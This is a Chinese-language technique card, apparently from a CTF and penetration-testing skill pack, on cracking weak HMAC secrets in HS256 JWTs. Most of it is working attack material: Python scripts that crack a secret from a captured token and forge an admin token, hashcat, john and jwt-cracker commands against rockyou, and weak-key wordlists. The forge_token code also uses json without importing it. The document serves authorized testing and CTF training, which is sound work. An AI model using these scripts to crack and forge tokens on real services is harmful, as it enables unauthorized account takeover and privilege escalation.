# JWT 弱 HMAC 密钥爆破

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/jwt/03-weak-key-bruteforce.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「HMAC / 弱密钥 / 爆破 / hashcat」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- HMAC
- 弱密钥
- 爆破
- hashcat
- HS256
- JWT cracker
- wordlist
- secret

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **检测信号** — Header 中 `alg` 为 `HS256` / `HS384` / `HS512`
2. **检测信号** — 无 `kid`/`jku`/`x5u` 字段（纯对称场景）
3. **检测信号** — 目标为开发/测试环境（弱密钥概率极高）
4. **检测信号** — 项目 GitHub 中有硬编码的 "secret" 或 "jwt_secret"

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **输入信号** — Header 中 `alg` 为 `HS256/HS384/HS512`
- **输入信号** — Token 来自开发、测试、比赛靶场、默认部署、开源项目 demo
- **输入信号** — `.env`, `config`, `package.json`, `docker-compose.yml` 暴露 `JWT_SECRET/APP_KEY/SECRET_KEY`
- **输入信号** — 项目名、域名、公司名、题目名、环境名明显，可生成定制字典
- **输入信号** — 多个 token 的 header/payload 结构一致，说明离线爆破稳定可复现
- **Evidence** — `jwt_crack_manifest.json`: token header/payload hash、alg、wordlist 来源、工具、命中 secret hash。
- **Evidence** — `forged_token_diff.json`: 原始用户 token、伪造 claims、接口响应、权限字段 diff。
- **Evidence** — 成功样本: 破解出的 secret 能重新签原 token，伪造 `sub/role/aud` 后触发高权限响应或 flag。
- **Evidence** — 失败样本: 字典/规则未命中、伪造签名通过但 claim 被拒、服务端 token 绑定 session。
- **Evidence** — 下一跳: 爆破失败转 `01-alg-none`, `02-algorithm-confusion`, `04-kid-injection`；签名过了但权限未变转 `06-claim-missing`。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 输入信号

- Header 中 `alg` 为 `HS256/HS384/HS512`
- Token 来自开发、测试、比赛靶场、默认部署、开源项目 demo
- `.env`, `config`, `package.json`, `docker-compose.yml` 暴露 `JWT_SECRET/APP_KEY/SECRET_KEY`
- 项目名、域名、公司名、题目名、环境名明显，可生成定制字典
- 多个 token 的 header/payload 结构一致，说明离线爆破稳定可复现

## 0. 字典优先级矩阵

| 来源 | 生成方式 | 命中倾向 |
|------|----------|----------|
| 配置泄露 | `JWT_SECRET`, `SECRET`, `APP_KEY` 原值及变体 | 最高 |
| 域名/项目名 | `target`, `target2026`, `target_secret` | CTF/开发环境 |
| 框架默认 | `secret`, `jwtsecret`, `changeme`, `your-256-bit-secret` | demo 项目 |
| Git 历史 | `git grep secret $(git rev-list --all)` | 迁移残留 |
| 题目语境 | 题目名、hint、作者名、flag 前缀 | CTF |

## 0.1 爆破结果判定

| 结果 | 判断 | 下一步 |
|------|------|--------|
| hashcat 命中 | secret 可复现签原 token | 伪造 role/uid/aud |
| 字典未命中 | HS 仍可能强密钥 | 转 claim/kid/jku |
| 多个 secret 命中 | 可能 token 被截断或算法错 | 用服务端 oracle 验证 |
| 伪造后 401 | claim/aud/iss 仍卡住 | 转 `06-claim-missing` |

### 0.2 语境字典生成器

弱密钥爆破的胜负点是字典，不是 hashcat 参数。把域名、题目名、项目名、框架名、配置泄露字段、支付密钥字段组合成第一批候选。

```python
# jwt_context_wordlist.py — 语境字典
def variants(seed):
    s = seed.strip()
    if not s:
        return
    lowers = {s, s.lower(), s.upper(), s.capitalize()}
    suffixes = ["", "123", "123456", "2024", "2025", "2026", "_secret", "-secret", "_jwt", "-jwt"]
    for base in lowers:
        for suf in suffixes:
            yield base + suf

def build_wordlist(seeds):
    seen = set()
    for seed in seeds:
        for v in variants(seed):
            if v not in seen:
                seen.add(v)
                yield v
```

命中后不要只报告 secret。继续生成 `forged_claim_matrix.jsonl`：`role/admin/sub/aud/iss/exp` 逐项变体、服务端响应、业务字段变化。若 secret 与 `APP_KEY/PAY_KEY/SESSION_SECRET` 重用，转 `../signature/03-key-attacks.md` 和配置泄露链。

## 原理

HS256/HS384/HS512 使用**对称密钥**，验证方和签发方共享同一个 secret。如果密钥强度不足（短密码、字典词、项目名），攻击者拿到一个合法 Token 后可离线暴力破解出密钥，之后无限伪造。

```
┌─────────────────────────────────────────────────────────┐
│ 攻击模型                                                │
│                                                         │
│   已获得: 一个有效的 HS256 JWT                           │
│   Token = Header.Payload.Sig                            │
│                                                         │
│   已知:   Sig = HMAC-SHA256(Header.Payload, secret)     │
│   未知:   secret                                        │
│                                                         │
│   方法:   离线猜测 secret，重算 HMAC，比对 Sig           │
│           匹配 → secret 被破解                           │
│                                                         │
│   复杂度: O(字典大小 × HMAC 计算)                        │
│           弱密钥（如 6 位小写字母）≈ 几秒                 │
│           强密钥（256-bit 随机）≈ 不可行                   │
└─────────────────────────────────────────────────────────┘
```

## 伪代码：暴力破解

```python
# brute_jwt_hs256.py
import hmac
import hashlib
import base64

def crack_jwt_secret(token: str, wordlist: list[str]) -> str | None:
    """
    对 HS256 JWT 进行离线字典攻击

    输入: token = "header.payload.signature"
          wordlist = ["secret", "password", "key123", ...]
    输出: 破解出的密钥，或 None
    """
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    header_b64, payload_b64, sig_b64 = parts
    message = f"{header_b64}.{payload_b64}".encode()

    # 目标签名 (Base64URL → bytes)
    # 补齐 Base64 padding
    sig_b64_padded = sig_b64 + '=' * (4 - len(sig_b64) % 4)
    target_sig = base64.urlsafe_b64decode(sig_b64_padded)

    for candidate in wordlist:
        computed_sig = hmac.new(
            candidate.encode(),
            message,
            hashlib.sha256
        ).digest()

        if hmac.compare_digest(computed_sig, target_sig):
            return candidate  # 破解成功

    return None  # 字典中未找到


def forge_token(header: dict, payload: dict, secret: str) -> str:
    """用破解出的密钥伪造 JWT"""
    def b64url(data):
        return base64.urlsafe_b64encode(
            json.dumps(data).encode()
        ).rstrip(b'=').decode()

    h_b64 = b64url(header)
    p_b64 = b64url(payload)
    sig = hmac.new(secret.encode(), f"{h_b64}.{p_b64}".encode(),
                   hashlib.sha256).digest()
    s_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    return f"{h_b64}.{p_b64}.{s_b64}"


# --- 攻击流程 ---
token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx"

# 步骤 1: 准备字典（自定义 + 公开字典）
wordlist = (
    open("custom_guesses.txt").read().splitlines() +
    open("/usr/share/wordlists/rockyou.txt", errors='ignore').read().splitlines()
)

# 步骤 2: 破解
secret = crack_jwt_secret(token, wordlist)
if secret:
    print(f"[+] Cracked! Secret = {secret}")
    # 步骤 3: 伪造
    admin = forge_token(
        {"alg": "HS256", "typ": "JWT"},
        {"sub": "admin", "role": "admin", "exp": 9999999999},
        secret
    )
    print(f"[+] Forged admin token: {admin}")
```

## 伪代码：增量爆破（自定义字符集）

```python
# 如果不确定密钥格式，可用有限字符集做增量爆破
import itertools

def crack_incremental(token: str, charset: str, max_len: int) -> str | None:
    """
    增量爆破：依次尝试长度 1..max_len 的所有排列
    适用于极短密钥 (≤ 6 字符)
    """
    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}".encode()
    target_sig = base64.urlsafe_b64decode(parts[2] + '==')

    for length in range(1, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            sig = hmac.new(candidate.encode(), message, hashlib.sha256).digest()
            if hmac.compare_digest(sig, target_sig):
                return candidate
    return None

# 仅小写字母 + 数字，最多 6 位
secret = crack_incremental(token, "abcdefghijklmnopqrstuvwxyz0123456789", 6)
```

## 常见弱密钥列表

```text
# 开发/测试环境高频密钥
secret
password
admin
key
private
changeme
test
dev
debug
jwt_secret
jwt_key
jwt-secret
SECRET_KEY
secretkey
mysecret

# 项目名/域名变体
[company_name]
[project_name]
[domain_name]
[docker_image_name]

# 简单模式
123456
qwerty
letmein
abcdef
aaaaaa
```

## 工具命令

```bash
# hashcat — GPU 加速 (mode 16500 = JWT)
echo "<token>" > /tmp/jwt.txt
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 /tmp/jwt.txt -a 3 '?l?l?l?l?l?l'   # mask: 6位小写字母

# john
echo "<token>" > /tmp/jwt.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/jwt.txt

# jwt_tool (CPU, 较慢)
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# c-jwt-cracker (C, 最快)
./jwt-cracker "<token>" "abcdefghijklmnopqrstuvwxyz0123456789" 6

# jwt-cracker (Go)
go run github.com/Sjord/jwt-cracker@latest "<token>"
```

## 检测信号

- Header 中 `alg` 为 `HS256` / `HS384` / `HS512`
- 无 `kid`/`jku`/`x5u` 字段（纯对称场景）
- 目标为开发/测试环境（弱密钥概率极高）
- 项目 GitHub 中有硬编码的 "secret" 或 "jwt_secret"

## HMAC 密钥强度对照

| 密钥类型 | 示例 | 爆破耗时 (单机) |
|----------|------|----------------|
| 6 位小写字母 | `abcdef` | < 1 秒 |
| 8 位小写+数字 | `abc12345` | ~ 1 分钟 |
| 常见单词 | `secret` | < 1 秒（字典命中） |
| 12 位随机 alphanum | `aB3xK9mP2qW7` | ~ 数年 |
| 256-bit 随机 | (32 random bytes) | 不可行 |

## 工作流

捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。


## Evidence

- `jwt_crack_manifest.json`: token header/payload hash、alg、wordlist 来源、工具、命中 secret hash。
- `forged_token_diff.json`: 原始用户 token、伪造 claims、接口响应、权限字段 diff。
- 成功样本: 破解出的 secret 能重新签原 token，伪造 `sub/role/aud` 后触发高权限响应或 flag。
- 失败样本: 字典/规则未命中、伪造签名通过但 claim 被拒、服务端 token 绑定 session。
- 下一跳: 爆破失败转 `01-alg-none`, `02-algorithm-confusion`, `04-kid-injection`；签名过了但权限未变转 `06-claim-missing`。
